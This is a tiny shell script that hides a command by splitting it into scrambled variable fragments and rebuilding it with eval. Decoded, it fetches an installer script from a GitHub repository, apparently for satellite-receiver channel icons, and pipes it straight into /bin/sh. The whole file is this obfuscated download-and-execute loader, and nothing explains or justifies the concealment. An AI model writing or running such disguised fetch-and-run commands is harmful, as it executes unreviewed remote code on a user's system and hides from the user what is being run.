z="
";Dz='/raw';Mz='icon';Fz='hubu';Rz='tall';Iz='nt.c';Hz='onte';Ez='.git';Tz='h -q';Xz='h';Kz='mil2';Sz='er.s';Oz='sat/';Qz='/ins';Bz=' htt';Jz='om/e';Lz='37/p';Uz='O - ';Pz='main';Nz='-yah';Az='wget';Gz='serc';Vz='| /b';Cz='ps:/';Wz='in/s';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz"